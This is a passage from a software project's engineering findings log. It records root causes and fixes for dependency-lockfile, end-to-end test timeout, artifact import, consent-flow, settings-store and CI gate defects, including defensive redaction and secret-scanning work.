  ATTRIBUTION, measured per commit rather than assumed: `f5ad86b` (pre-merge, this line of work)
  **passes**; `1984ac0` (pre-merge `origin/main`) **fails**; every commit after the merge fails
  because the merge resolved `package-lock.json` to theirs. So it arrived with the Cofre line and
  the merge carried it forward.
  WHY IT SURVIVED: every offender is an OPTIONAL `wasm32-wasi` platform package. `npm install`
  skips optional deps for other platforms and reports success; `npm ci` validates the whole tree
  including them and refuses. Local development uses `npm install`, so only a clean-machine
  install — CI, and a Docker build — ever sees it.
  FIXED (second attempt — the first, `a65f758`, did NOT work and said it did; see below): resolve
  FRESH with `node_modules` deleted as well, so npm reads the REGISTRY instead of what is on disk.
  That is the whole difference: with a tree present, `npm install` preserves installed versions and
  produces a lock that only reconciles against that tree; with it gone, resolution is clean. Result:
  57 packages up, 2 down, every override honoured (`fast-uri 3.1.5`, `postcss 8.5.25`,
  `next 16.2.12`), no Agent SDK or Playwright regression.
  A SECOND defect surfaced underneath: the fresh lock silently omitted FOUR packages that
  `eslint@9.39.5` declares — `@eslint/config-array`, `@eslint/config-helpers`, `@humanfs/node`,
  `@humanwhocodes/retry`. npm will not add them on repeated installs, because the ROOT pins
  `eslint@8` and the `@eslint/*` scope then resolves against the wrong major, so v9's own deps fall
  through. Found by enumerating all 34 of eslint 9's declared deps against the lock rather than
  fixing them one crash at a time. They are now declared explicitly in `web/package.json` at the
  versions eslint itself asks for — making an existing requirement explicit, not inventing one.
  REJECTED, and worth recording because it looks like the obvious fix: a wholesale
  `rm package-lock.json && npm install`. It produced a lock npm accepts, and moved 99 top-level
  packages — several BACKWARDS past deliberate security overrides. `package.json` pins
  `fast-uri: ^3.1.4`; the regenerated tree took `fast-uri 3.0.0-3.1.3` and the audit gate went red
  with 7 unaccepted high advisories, while a Next downgrade broke web lint. Valid to npm, wrong for
  this repo.
  THE SHARPER LESSON, in three parts, because each cost a wrong conclusion:
  1. A first attempt dropped the root `picomatch`. **`npm ci` passed anyway**, then eslint died at
     runtime with `Cannot find module 'picomatch'` — `micromatch` resolves it from the root. A green
     `npm ci` is not proof the tree WORKS.
  2. Worse, `a65f758` claimed to fix this and did not. It was verified against probe directories
     holding only the root `package.json` + lockfile and NO workspace manifests, so npm could not
     resolve the workspaces at all and its errors were artefacts of the probe. **A workspace repo's
     lockfile can only be tested in a probe carrying every workspace manifest** — the same set the
     Dockerfile COPYs. Build the probe wrong and it will lie in both directions.
  3. `npm test` can exit 1 with every test passing: `fs.inotify.max_user_instances` is 128 on this
     host, and chokidar's watchers throw `EMFILE` once it is exhausted (105 long-lived headless
     chromium processes from a parallel tool held 96). All 3376 tests passed; only watcher creation
     failed. Check `/proc/sys/fs/inotify/max_user_instances` before reading that exit code as a
     regression.

- **`thirty-specs-budgeted-waits-they-could-never-use`** (FIXED 2026-08-01, HIGH, test-estate — the
  single largest cause of this estate's "flakiness"). `playwright.config.ts` set no `timeout`, so
  Playwright's **30s default per-test cap** applied, while **30 of the 76 specs** budget individual
  assertions above it: `legal-cadeia-credito` 120s, `demo-spine`/`gateway-keys`/`legal-jurimetria`/
  `legal-rcbe` 90s, and 25 more at 60s. Every one of those budgets was DEAD CODE — the test was
  killed by the global cap before its own wait could elapse.
  The output said so plainly, on two adjacent lines, and had done for as long as the estate has
  run:
  `Test timeout of 30000ms exceeded.` directly above `Expect "toHaveCount" with timeout 90000ms`.
  It reads as a product hang and is nothing of the sort, which is exactly why it kept being triaged
  as "flake under heavy machine load": the closer the machine ran to the cap, the more specs tipped
  over, and WHICH ones varied per run. Several `docs/known-flakes.md` entries describing
  load-dependent failures at the tail of a long suite are candidates to re-read in this light.
  FIXED at the config, one line, not thirty edits: `timeout: 180_000` — above the longest legitimate
  wait (120s) with headroom, and a BACKSTOP rather than the bound, since each assertion still fails
  at its own budget so a stuck test surfaces where it stuck. Specs needing more still override with
  `test.setTimeout` (part-b-proof 1500s, voice-proof 480s, demos 300s).
  This was the second half of the demos cluster: on the wrong web port their bridge handshake also
  failed, so BOTH causes were real and each alone was enough to keep 28 tours red.

- **`artifact-backend-runtime-never-wired`** (FIXED 2026-08-14, HIGH, feature inert — found by
  repairing `artifact-backend-panel.spec.ts`; closed by the salomao-migration S1 slice, where a
  working `onEmail` plane became a headline customer requirement). **Artifact backends (Layer 2) cannot run at all.**
  `setArtifactBackendRuntime()` is defined in `api/src/apps/backend-runtime/runtime.ts` and is
  called from **nowhere** in `api/src`, so the module singleton stays `NullArtifactBackendRuntime`
  for the process's whole life and every `invoke` returns
  `{ ok: false, error: 'artifact backend runtime is not initialised' }`. `WorkerThreadRuntime`, the
  real implementation, is right there at `runtime.ts:166` — written, exported, never installed.
  Nothing outside the `backend-runtime/` directory imports the module at all.
  WHAT A USER SEES: an app can declare `backend: { entryPoint, handlers }`, the import builds it
  (`appBuilder.build` compiles the backend bundle), and the panel reports `hasBackend: true` with
  the handlers `declared` — so it all looks wired. Then every invocation fails, and
  `events/`-driven trigger delivery into an artifact backend silently does nothing.
  Verified against the running api: import an app with a declared backend, poll `sample-run` for
  40s, get "not initialised" on every attempt while `GET /:id/backend` cheerfully reports
  `hasBackend: true, declared: { entryPoint: 'backend/index.js', handlers: ['onEmail'] }`.
  NOT fixed here deliberately. Wiring it means constructing `RuntimeDeps` at the composition root —
  `resolveOwner`, `resolveBundlePath`, and the capability surface that mints tokens for user code
  executing in worker threads. That is a security-relevant change to an execution boundary, which
  the review policy sends to adversarial review; improvising it inside a red-fixing pass is exactly
  how such a thing lands unreviewed. `api/tests/security/` has suites for the capability layer that
  should be re-read as part of doing it.
  `web/e2e/artifact-backend-panel.spec.ts` is skipped at file level naming this finding, with its
  polling precondition left intact so the file starts working the moment the runtime is installed.
  This is the SAME SHAPE as the daemon seam that sat on its "honest default" until it was wired —
  see `docs/decisions.md` 2026-07-31 and the `LocalCommandSpec` docblock. Worth noting as a pattern:
  a seam with a null default reads as finished from every angle except running it.
  FIXED (2026-08-14, S1): `buildApp` (`api/src/server.ts`) now constructs `WorkerThreadRuntime`
  and calls `setArtifactBackendRuntime` — the deliberate composition-root change the paragraph
  above deferred, done as its own slice rather than inside a red-fixing pass. Seams bound: app-data
  through `AppDataAccess` on the injected deps; the model capability through the `llm/` public
  entry (`completeFast`, `user_work` / `artifact-backend:<entrypoint>`, billed to the artifact
  OWNER with the artifact stamped); `notify.email` through the SAME consent-gated app-email plane a
  served page uses (`sendAppEmail` with the owner as actor — a backend cannot out-privilege its
  app); `notify.inApp` on the notifications SSE rail. `resolveOwner`/`resolveBundlePath` stay on
  the runtime's own production defaults (one implementation, Rule 1). No integration seam is
  granted. Disposal runs on the boot shutdown path and on factory re-composition
  (`disposeArtifactBackendRuntime`, fail-closed back to the Null runtime). Suites:
  `api/tests/apps/backend-runtime-wiring.test.ts` (composition: a built app registers a non-Null
  runtime; teardown restores the fail-closed Null; capability grants match the pinned set) plus the
  pre-existing runtime/delivery suites now exercising the real path; the file-level skip on
  `web/e2e/artifact-backend-panel.spec.ts` is REMOVED — the spec's polling precondition, left
  intact for exactly this moment, now gates on real invokes.

- **`artifact-import-posts-a-shape-the-contract-rejects`** (FIXED 2026-07-31, HIGH, correctness —
  a live user-facing break, found by repairing the specs that existed to catch it). **Artifact
  import and bundle-update were broken end to end.** `web/lib/artifact-bundle.ts` reads an export or
  a "Transferir código" zip into a PORTABLE envelope — `{ schemaVersion, manifest, scaffold:
  [{ path, contentB64 }] }` — and `artifacts-surface.tsx` posted it, unconverted, at
  `POST /api/v1/artifacts/import`, whose contract (`shared/src/artifacts.ts`) is
  `{ manifestId, name?, files: [{ path, content }], data? }`. The server validates against the
  contract, so every import answered **400 VALIDATION_FAILED**, `path: ["bundle","manifestId"]`,
  which the UI showed as **"Dados inválidos."** Four call sites: `import` plus all three
  `bundleUpdate` paths.
  HOW IT SURVIVED TYPECHECK, which is the part worth remembering: TWO different types are named
  `ArtifactBundle` — this file's and the contract's — and each call site bridged them with
  `bundle as ArtifactBundle`. The cast is between unrelated shapes and TypeScript took it purely
  because the names matched. Past validation it would still have written NOTHING, since the server
  writes from `bundle.files` and the portable envelope has `scaffold`.
  FIXED with `toContractBundle()` on the reader's side (the contract is the source of truth), the
  four casts replaced by real conversions, and the local type imported as `PortableBundle` so the
  name collision cannot re-arm the same mistake. Proven against the RUNNING api: the same bundle
  gives 400 raw and 201 converted, with files written and UTF-8 intact. Pinned by four tests in
  `web/__tests__/lib/artifact-bundle.test.ts`; the UTF-8 one is revert-proofed (byte-wise decode
  yields `olÃ¡`).
- **`import-loses-the-manifest-so-a-backend-app-arrives-without-its-backend`** (FIXED 2026-08-01,
  HIGH, correctness — found while proving the import fix above). The contract's `ArtifactBundle` has
  no manifest field: only `manifestId, name, slug, files, data, version`. But `bundleFromZip`
  deliberately lifts `manifest.json` OUT of the scaffold into its own field ("the manifest travels
  in its own field"), so converting portable → contract dropped it entirely. The server writes the
  bundle's files, then `ensureManifest()` finds no manifest.json and writes a DEFAULT one — so
  everything the manifest declared was silently lost on import: `backend` (entryPoint + handlers —
  the app arrives with no backend at all), `extends`, `type`, `entryPoint`.
  Proven both ways against the running api: import the same app without manifest.json →
  `hasBackend: false, declared: null`; with it → `hasBackend: true, declared: { entryPoint:
  'backend/index.js', handlers: ['onEmail'] }`. FIXED in `toContractBundle` by appending the
  manifest as a `manifest.json` FILE — the only channel the contract has, and the one
  `ensureManifest` reads (it keeps an existing manifest and only forces id/name).
- **`featured-update-badge-unreachable-from-a-spec`** (OPEN 2026-07-31, LOW, test-coverage — a
  hardening, not a defect). `artifacts-apps-section`'s update-badge test seeds itself by PATCHing
  `data.customized` + `data.updateAvailable`. Both are in `RESERVED_ARTIFACT_DATA_KEYS` and stripped
  twice (route boundary and `patchArtifact`), deliberately: the same list stops a client writing
  `projectDir` (build-sandbox path injection) and `tours` (stored-content injection into the public
  `GET /api/demos/:appId`). A client that could forge "this app has an update" could also drive the
  flow it gates. The old RPC dispatcher allowed it; the rebuild closed it, correctly. So the fixture
  path is closed BY DESIGN and there is no legitimate public route to the state. The BEHAVIOUR is
  still worth covering — it needs a server-side seam (drive `featured-seeder.ts` with a bumped
  manifest version), which is a harness change with its own design. The test is skipped with this
  reasoning inline. Explicitly NOT done: widening the reserved-key list to make a test pass, which
  trades a security control for a green tick.
- **`a-tracked-test-file-that-vitest-never-loads`** (FIXED 2026-07-31, MEDIUM, test-estate — found
  by appending four tests to it and watching them not run). `web/lib/artifact-bundle.test.ts` was
  tracked in git, looked like coverage, and had **never executed**: `web/vitest.config`'s include is
  `['__tests__/**/*.test.{ts,tsx}', 'src/**/*.test.{ts,tsx}']`, and the file sits in neither. It was
  a leftover from the G9 frontend copy — an exact duplicate of the live
  `web/__tests__/lib/artifact-bundle.test.ts`, same nine test names. The suite-ledger census cannot
  see it either: it counts `web/__tests__` only, so the file was invisible from both directions.
  DELETED, with its unique value (nothing) established by diffing the test sets first. Worth
  recording as a class, not an incident: a test file outside the include is worse than no file,
  because it reads as coverage in review and in a directory listing. It was the ONLY one — checked.

- **`ported-e2e-estate-is-not-green`** (FIXED 2026-08-01 — **the estate is green**: 247 passed /
  0 failed / 8 skipped in 17.2m, `[suite-ledger] OK — census matches, every non-due artifact
  ledger-skipped, ratchet holds`, exit 0. Measured on a FRESH stack via `npm run e2e:server`, which
  matters: a warm reused stack accumulates state across runs, and re-running `demo-spine` alone
  deletes the shared Fonseca spine that later specs read. Several "flaky" readings during this work
  were that, self-inflicted. The causes are below and each has its own entry: the port artifact
  (`e2e-server-loses-to-a-running-dev-server`), the 30s cap
  (`thirty-specs-budgeted-waits-they-could-never-use`), three specs on a retired dispatcher, and
  two specs that could never pass on any checkout. Original entry kept below for the measurements.)
- **`ported-e2e-estate-is-not-green` — original 2026-07-31 record** (MEDIUM, process).
  `CLAUDE.md` says the ported estate "stays green on every PR" and that "a red baseline spec is fixed
  before any new work merges". It is not green and has not been for some time. Measured on this
  machine at gate G12, 242 due specs:
  - `origin/main` (`1984ac0`) alone: **49 failed / 179 passed** and **51 failed / 176 passed** on two
    runs of IDENTICAL code — so roughly two specs are outright flaky before anything else is said.
  - the merge (`4261a75`): **39 failed / 190 passed**, and its failure set is a STRICT SUBSET of
    `origin/main` run 1's. Nothing regressed; two specs that differ from run 2 both failed on run 1.
  - after the repairs below (`d6d922f`, same day): **37 failed / 205 passed / 5 skipped** in 37.4m.
    No new failures (the set is a strict subset of the 39), and the +15 passes are exactly the two
    repaired specs: `legal-shared-drift` now contributes 11 and `settings-redirects` 4. Runtime rose
    6.8 minutes, which is the cost of the `demos` budget fix below: those 28 now fail HONESTLY after
    ~60s each instead of being killed misleadingly at 30s. A fast lie is worse than a slow truth,
    but the real end state is fixing the spec, not paying that every run.
  Three of the 39 were provably broken rather than failing, and TWO OF THOSE ARE NOW CLOSED
  (2026-07-31, same day):
  - `legal-shared-drift.spec.ts` shelled out to `scripts/sync-legal-shared.mjs`, which is in neither
    parent — MODULE_NOT_FOUND on every run the estate has ever done. REWRITTEN to assert the
    invariant that script existed to protect, using only what this repo has: the shared layer's ten
    files must be byte-identical across every `legal-*` scaffold. It does not import a canonical
    directory, because choosing where that lives in this repo is a design decision and not a
    mechanical port — if all copies agree, the canonical layer is what they agree on. Now a REAL
    gate: 11 tests over 29 apps × 10 files, green, and verified to go red on a one-line drift probe.
  - `simuladores-trabalho.spec.ts` built from `join(process.cwd(), '..', 'ekoa-data', …)`, resolving
    OUTSIDE the checkout. RETIRED explicitly (ledger `retired` band, with the reasoning): it drove a
    UI app that was never ported here and is a featured artifact in neither repo. Nothing is lost —
    every figure it asserted is covered by `api/tests/legal/simuladores.test.ts`, 18 tests over the
    ported pure engine. If that app is ever ported, the spec comes back with it.
  The third is the big one and is STILL OPEN — see `demos-tour-waits-for-a-button-that-never-renders`
  below, which now has half of it fixed and the other half root-caused to a specific line.
  `docs/testing.md` does acknowledge "committed-baseline debt" in three named bands, but the debt is
  larger than those bands and is not enumerated anywhere, which is the actual problem: a red estate
  cannot detect the next failure.
- **`demos-tour-waits-for-a-button-that-never-renders`** (OPEN 2026-07-31, MEDIUM, test-estate — 28
  of the estate's reds, one cause, half of it now fixed). All 28 `demos.spec.ts` tours failed
  identically. There were TWO stacked causes and the first was hiding the second.
  - **FIXED — the test budget.** The file's waits were written as though they had minutes:
    `clickNext` allows 60s, the banner 90s, the overlay 45s. `playwright.config.ts` sets no
    `timeout`, so Playwright's DEFAULT 30s per-test cap applied and every one of those budgets was
    dead code. The output said so plainly and had been misread for as long as it has been printed:
    `Test timeout of 30000ms exceeded` sits directly above
    `Expect "toBeVisible" with timeout 60000ms`. A `test.setTimeout(300_000)` now gives the file the
    budget its own waits assume — the convention every other long spec here already follows
    (live-bridge 180s, summary-cards-chip 240s, voice-proof up to 480s).
  - **OPEN — what it was hiding.** With a real budget the tour genuinely runs: it logs in, mounts
    the overlay, and steps into the loop. It then dies waiting the full honest 60s for
    `demo-next` on a `step.to` navigation step. `DemoOverlay.tsx` renders that button only when
    `tour.awaitingManual && tour.status === "running"`; the sibling branch renders `demo-awaiting`
    for `status === "awaiting"`. So the tour is in a state that legitimately has no Next button and
    the SPEC is what is wrong: `demos.spec.ts:274` calls `clickNext` unconditionally whenever
    `step.copy` is set, without first checking that the tour is actually waiting for a manual
    advance. Likely a navigation step auto-advances and never gates on the user at all.
    NOT fixed here deliberately: correcting it means changing how the spec walks the tour state
    machine, and doing that without understanding the machine is how you get a test that passes for
    the wrong reason. The next person starts from a named line and a named condition rather than
    from "timeout".
- **`e2e-server-loses-to-a-running-dev-server`** (OPEN 2026-07-31, MEDIUM, tooling — cost a full
  30-minute run before it was noticed). `npm run e2e:server` binds three ports and only one of them
  is configurable in practice: `EKOA_WEB_PORT` (3000) and `EKOA_API_PORT` (4211) come from env, but
  the CORS proxy port is `readBackendPort()` — the committed `backend.port` — because `next.config.ts`
  INLINES that origin into the browser bundle. On a machine with a dev server already on :3000 the
  web app dies with `EADDRINUSE` and the harness reports **130 due artifacts red plus "10 drivers
  require a live dev API"**, which reads exactly like a catastrophic code regression and is not one.
  Worse for anyone checking first: the collision here was with an IPv6-only listener (`:::3000`), so
  a `/dev/tcp/127.0.0.1/3000` probe reported the port FREE. Use `ss -ltn`, and pass
  `EKOA_WEB_PORT` + `WEB_BASE_URL` together (the Playwright `baseURL` reads the latter, the harness's
  readiness poll the former — setting only one silently checks the wrong app). Recorded rather than
  fixed because the real fix is to make the proxy port configurable end-to-end, which means the
  inlined origin in `next.config.ts`, and that is its own change.
  **`EKOA_WEB_PORT` only rescues you when the other server is in a DIFFERENT directory.** Point the
  harness at a free port while a `next dev` is already running against the SAME `web/`, and Next's
  own single-instance guard refuses before the port is ever used: *"Another next dev server is
  already running"*, with the PID and directory. So the workaround holds from a second worktree and
  does NOT hold in the checkout that already has a dev server up — there, the only options are to
  stop that server or to verify from a worktree. Learnt the second way, after the first fix looked
  like it had worked.

- **`consent-once-re-prompts-forever`** (FIXED 2026-07-31, MEDIUM, correctness — found while merging
  the capability-contract and Cofre lines of work). `resolveConsent`'s `once` persisted nothing
  (correctly — that is the answer's whole meaning) and set the resume flag; the engine then re-ran
  the step, `local-command.ts` re-read the DURABLE approvals store, found nothing, and raised the
  same dialog. The only exits were "sempre" and "parar" — the two answers the user had just declined
  to give. There was no per-run consent state anywhere in the module: `signals` carried
  `resumeFlag`/`cancelled` and nothing else. PRE-EXISTING on both merged lines. FIXED with a
  run-scoped `runApprovedShapes` set on the signal record, threaded through `RunContext` and checked
  BEFORE the durable store so a one-off answer never touches it; in memory only, so a restart
  re-asks (the safe direction). The shape check now binds `once` as well as `always` — a mismatched
  `once` is the same caller-supplied-shape hole with a shorter blast radius. Pinned by two tests in
  `api/tests/automation/service.test.ts`; the first drives `once` to COMPLETION and then asserts the
  store is still empty, so it proves both halves at once. Reverting the executor's check makes it
  fail by TIMEOUT rather than assertion — the loop itself, observed.
- **`consent-approval-scope-mismatch`** (FIXED 2026-07-31, MEDIUM, correctness — found by merging,
  not by either line of work on its own). J-7 made a command-shape approval key on owner + org +
  MACHINE, and `executors/local-command.ts` looks it up with the connected daemon's real
  `pairingId`. `service.ts:resolveConsent` wrote it with `pairingId: null`. `idFor()` is an exact
  key, so the row written was never the row read: **"aprovar sempre" banked nothing the executor
  could find, the step re-checked, and the same consent dialog returned — forever — on precisely the
  machines able to run the command.** Invisible on both lines of work for the same reason: every
  consent test connects a fake daemon with no `pairingId`, so write and lookup both collapsed to
  `null`. The wiring of the daemon seam at the composition root (`server.ts`, which hands back
  `conn.pairingId`) is what made it reachable. FIXED by recording the scope on the ConsentRequest at
  the moment the executor asks — the party that will re-read it decides the key — and having
  `resolveConsent` bank the answer in it rather than re-derive one. Pinned by
  `api/tests/automation/service.test.ts` "banks the approval for the MACHINE the run is awaiting on",
  which uses a non-null `pairingId` and asserts the run COMPLETES, not just that a row exists;
  verified to fail on revert (`expected false to be true`).
- **`step-log-tail-outside-the-h1-filter`** (FIXED 2026-07-31, LOW, security defence-in-depth —
  found by reading the merged engine, not by a failing test). `redactStepRecord` (Cofre H-1) filters
  `error.message`, `error.details`, `output` and `resolvedAction` before a step record reaches the
  SSE stream, and its docblock says a new SINK inherits the filter. It does — but a new FIELD does
  not, and `logTail` (slice E4, the bounded tail of what a step streamed) arrived from the other line
  of work. So the emitted record carried the tail unfiltered. NOT a live leak on the wired path: the
  tail's only production source is daemon output, which is redacted at bridge INGRESS (H-4) before
  the engine ever sees it, and the persisted+served copy comes from the same already-filtered text.
  FIXED so the docblock is true of the whole record. Pinned by `api/tests/automation/run-logs.test.ts`
  "a secret streamed into the tail is redacted out of the emitted step record", which asserts the
  chunk really carried the value before asserting the emitted record does not; verified to fail on
  revert.
- **`binary-bytes-allowlist-went-stale-in-the-merge`** (FIXED 2026-07-31, LOW, hygiene). Two of the
  three shrink-only allowlist entries in `api/tests/security/binary-bytes-gate.test.ts`
  (`apps/document-source.test.ts`, `llm/anonymise/index.ts`) were cleaned by `1984ac0` on a parallel
  line of work that had never seen the gate. The ratchet did exactly its job at the merge: it failed
  on the stale entries instead of passing over them. Entries removed; the list is down to one.
- **`typist-emits-no-registo-row`** (OPEN 2026-07-29, LOW, auditability — found while pinning F-5).
  `typistLogin` records credential use on the ITEM (`lastUsedAt`/`lastUsedBy` via `recordUse`) but
  emits no Registo row, although the A-6 vocabulary defines `cofre_item_used` for exactly this. So a
  user reading their Registo sees the unlock and the grant but not the login that consumed it. Not a
  leak — the item row is metadata-only and carries no value — but an audit gap on the one primitive
  that handles a decrypted credential against a live page. Asserted in
  `api/tests/security/typist-non-memorable.test.ts` in the NEGATIVE direction so it is visible
  rather than assumed; flip that assertion when the row is emitted.
- **`trigger-null-target-blanks-the-webhooks-list`** (FIXED 2026-07-29, MEDIUM, correctness — found
  by repairing the e2e estate). `GET /api/v1/triggers` emitted `automationId: null` for a trigger
  created against an ARTIFACT (and `artifactId: null` for the reverse). `shared/` types both as
  `Id.optional()`, and zod's `.optional()` accepts `undefined` but **rejects `null`** — so
  `TriggerListResponse` failed to parse client-side, `tryCall` reported not-ok, and the webhooks
  store kept an empty array. The user saw **"Ainda não existem webhooks" over a populated
  database**, with no error surfaced anywhere: creating a webhook returned 201, the row never
  appeared, and nothing said why. FIXED in `triggerView` by omitting absent optionals instead of
  passing null — the same field-by-field discipline `sessionView` already uses. Worth recording why
  this survived a surface the schema-coverage gate marks COVERED: every existing fixture set one
  target or the other, so `null` never appeared in a test. The new cases construct the real
  database shape (an explicit `null`) and go red against the old mapper.
- **`pipedream-master-switch-inert`** (FIXED 2026-07-29, HIGH, security — found by repairing the e2e
  estate, not by reading code). The Pipedream master toggle **could not be turned off**.
  `PATCH /api/v1/settings` persists via `patchOrgSettings`, which writes the ORG document
  (`orgs[orgId].settings`); the enforcement read `isPipedreamEnabled()` went to
  `settings.get('default')` — a different collection, and a document nothing ever writes. It
  therefore always read null, and on null returned `undefined !== false` → **true**. Two independent
  defects compounding: the wrong store, and a FAIL-OPEN default on a third-party egress integration.
  Symptoms an operator would see: turning it off returns 200, `GET /settings` reports
  `pipedreamEnabled:false`, and the UI toggle snaps back to on — because the toggle renders
  `status.enabled` (the broken read) while writing to settings. `runPipedreamAction`'s `disabled`
  guard never fired once. FIXED: the read now uses the org document the write lands in, and defaults
  to DENY, matching `mergedSettings` (what the API and UI report). Pinned by
  `api/tests/security/pipedream-master-switch.test.ts` (8 cases; 7 go red against the original).
  Note for auditors: two pre-existing tests in `tests/integrations/pipedream.test.ts` "disabled" the
  feature by writing `settings['default']` — they passed by exercising the bug's own plumbing, which
  is why the defect survived a suite that appeared to cover it.
- **`npm-audit-gate-unsatisfiable-and-unread`** (FIXED 2026-07-29, MEDIUM, process/security). The
  `security-gates` job had been failing at `npm audit --audit-level=high` (17 vulnerabilities, 10
  high). The gate was UNSATISFIABLE as written and therefore unread: two of its highs have no fixed
  version at all, so the only ways to green were to drop the threshold (stop seeing highs) or wait
  forever. Meanwhile the genuinely actionable production advisories sat unnoticed behind the noise.
  FIXED in two parts. **Upgrades** (production highs 9 -> 0 unaccepted): `next` 16.2.10 -> 16.2.12,
  `dembrandt` 0.23.1 -> 0.25.1, `react-router-dom` -> 7.18.2, plus root `overrides` forcing
  `postcss` 8.5.24, `sharp` 0.35.3, `adm-zip` 0.6.0, `fast-uri` 3.1.4. **A real gate**
  (`scripts/audit-gate.mjs`) replacing the blunt flag: it blocks on any unaccepted high/critical in
  the PRODUCTION tree (`--omit=dev` — those ship), reports dev-tree highs without blocking (a DoS in
  the linter's glob matcher is not a path to tenant data), and accepts only explicitly documented
  advisories, each stating why it is unreachable and what would close it. Acceptance propagates
  transitively to a fixpoint, so a six-deep chain resolves from its root advisory. Verified
  non-vacuous: a planted unlisted critical fails, and a package that gains its OWN advisory cannot
  launder it through an accepted dependency.
- **`archiver-8-removed-the-factory-api`** (OPEN by design 2026-07-29, LOW, dependency). `archiver@8`
  clears the entire archiver advisory chain, and was tried and REVERTED. v8 is pure ESM exporting
  classes (`Archiver`, `ZipArchive`, ...) with no default and nothing callable, so
  `archiver('zip', ...)` in `api/src/services/app-archive.ts` becomes `TypeError: archiver is not a
  function` and the artifact download 500s (caught by `app-archive.test.ts` +
  `artifact-family.test.ts`). Migrating is a rewrite of a user-facing download path, not a shim, and
  the advisory it closes is a glob-expansion DoS that this code cannot reach — entries are added one
  at a time as `archive.file(absolutePath, { name: relPath })` from our own directory walk;
  `archive.glob()` and `archive.directory()` are never called. Accepted in `scripts/audit-gate.mjs`
  with that reasoning. Do the migration the next time `app-archive.ts` is opened for other reasons.
- **`e2e-estate-15-red-first-honest-measurement`** (PARTIALLY FIXED 2026-07-29 — 9 of 15 closed).
  With the CSP/CORS bring-up repaired, the estate ran to completion for the first time and reported
  15 real failures. They were never one problem. **FIXED (9):** five specs drove
  `POST /api/v1/action`, the old Cortex RPC dispatcher, which this repo does not implement and which
  is absent from `shared/` entirely — repointed to REST (`web/e2e/helpers/backend-rest.ts`), fixing
  onboarding (x3) and vertical-profile; two order dependencies (onboarding never set the LEGAL
  vertical its chips need; pages-manage's bare `getByRole('tab')` now spans page tabs AND filter
  pills, so `.nth(1)` navigated off the panel holding the search box); two stale ENGLISH selectors in
  a PT-PT product (`/Usage/i` vs "Utilização"; `iframe[title*="Preview"]` vs "Pré-visualização"); and
  two REAL PRODUCT BUGS with their own entries — `pipedream-master-switch-inert` and
  `trigger-null-target-blanks-the-webhooks-list`. **STILL OPEN (6),** each needing a decision rather
  than a fix:
  - `artifacts-apps-section`, `update-from-bundle`, `artifact-backend-panel` — need `ekoa.templates`
    / `ekoa.artifact-backend`, surfaces with **no route and no `shared/` module** in the rebuild.
    Either that functionality is still wanted (build it) or the specs are stale (retire them
    explicitly, per the QA process). Not a call to make silently from a test file.
  - `legal-shared-drift` — invokes `scripts/sync-legal-shared.mjs`, which exists nowhere in the repo
    or its history, against a canonical `ekoa-data/legal-shared/` that also does not exist. The
    invariant is real (six scaffolds must not drift from a shared layer); the tool was never ported.
  - `simuladores-trabalho` — needs `ekoa-data/apps/simuladores-trabalho/build.mjs`, a user-app build
    artifact not in the repo. The underlying logic IS ported and unit-tested
    (`api/src/legal/simuladores.ts`, `api/tests/legal/simuladores.test.ts`).
  - `legal-rcbe` — NOT idempotent: it completes the demo obligation and re-running finds it already
    `cumprida`, so it asserts "atraso|Pendente" against fulfilled state. The scaffold has a reset,
    but it is gated on `isDemoActive()` (an injected tour runtime the spec cannot trigger) and the
    data lives in served-app shared storage that survives runs. Needs a deterministic reset hook.

- **`ci-e2e-step-could-never-pass`** (FIXED 2026-07-29, MEDIUM, process — surfaced when the lane
  first reached the e2e step). With typecheck, `npm test` and `npm run build` all green for the
  first time, `npm run e2e` failed for two structural reasons, neither a test defect: (1) Playwright's
  browsers were never installed on the runner, so the first `chromium.launch()` died with
  "Executable doesn't exist at ~/.cache/ms-playwright/..." — `Dockerfile.api` already installs them
  for exactly this reason; (2) the step ran the BARE ledger runner, which needs a live api on :4111
  and reports "10 due driver(s) require a live dev API — an unreachable-server skip is NOT green".
  The repo already contains the fix: `scripts/e2e-with-server.mjs` (`npm run e2e:server`) boots
  dev-api on an ephemeral memory-mongo, waits for READY plus the featured prebuild, runs the ledger
  and tears down — and its own docblock says "CI sets EKOA_SCREENSHOTS_DISABLED", i.e. it was
  written for this lane, which then never called it. FIXED by installing chromium and calling
  `e2e:server`; it needs `npm run build` output, which the preceding step already produces. Same
  class as `ci-typecheck-never-ran` and `subprocess-isolation-test-could-never-pass-on-ci`: a step
  that had never once executed its actual work, invisible for as long as an earlier step failed
  first.
- **`subprocess-isolation-test-could-never-pass-on-ci`** (FIXED 2026-07-29, MEDIUM, test-integrity
  — surfaced the moment CI first reached `npm test`). `api/tests/llm/subprocess-isolation.test.ts`
  asserted that the literal string `ekoa-code` appears nowhere in the SDK subprocess spawn contract,
  using the repo's directory NAME as a proxy for "a host path leaked". On GitHub Actions the repo is
  *named* `ekoa-code`, so GitHub's own injected metadata (`GITHUB_REPOSITORY`,
  `GITHUB_WORKFLOW_REF`) and npm's workspace-PARENT bin entry
  (`/home/runner/work/ekoa-code/node_modules/.bin` — NOT under the checkout root, so correctly kept
  by the F25 `underPathRoot` filter) all contain it. **The test was green locally and structurally
  red on CI, and could never have passed there.** Nobody saw it because the lane died at typecheck
  before reaching `npm test` (`ci-typecheck-never-ran`) — fixing CI is what exposed it. FIXED by
  asserting the invariant the code actually implements: the sandbox is neither the server cwd nor
  the operator home, `env.HOME` is the sandbox, no NON-PATH value carries the checkout or the
  operator home, and PATH carries no segment under the checkout root. PATH is exempt from the
  home-check BY DESIGN and by written disposition (the accepted `subprocess PATH home-path residual`
  below): node and the toolchain live under `$HOME` on nvm/fnm/volta/asdf hosts and the SDK spawns a
  bare `node` against this PATH, so filtering `$HOME` out of it ENOENTs every model subprocess.
  Verified three ways: passes under the simulated CI vars, the old assertion provably fails under
  the same vars, and it still goes red when the PATH-root filter is removed.
- **`gitleaks-red-on-synthetic-fixtures`** (FIXED 2026-07-29, MEDIUM, process — found when the
  first push finally reached CI). The `security-gates` job had been RED since 2026-07-27, failing at
  the gitleaks step on five `generic-api-key` hits. All five are synthetic credential fixtures in
  the Cofre security suite (`sk-live-COFRE-TEST-0001`, `sk-live-EXFILTRATE-ME-0001`,
  `sk-live-BOUNDARY-TEST-0001`, `sk-live-abcdef123456`, and — added by this session's J-3 —
  `deliver-me-J3-SECRET-9911`). They are deliberately secret-SHAPED, because the suites they belong
  to test that a secret-shaped value is redacted, refused or never echoed, and a fixture that did
  not look like a credential would prove nothing. Two consequences of the redness are the reason
  this is MEDIUM rather than cosmetic: a red gate carries no signal, and it had been red long enough
  that a REAL leak would have arrived into an already-failing check. FIXED by allowlisting the five
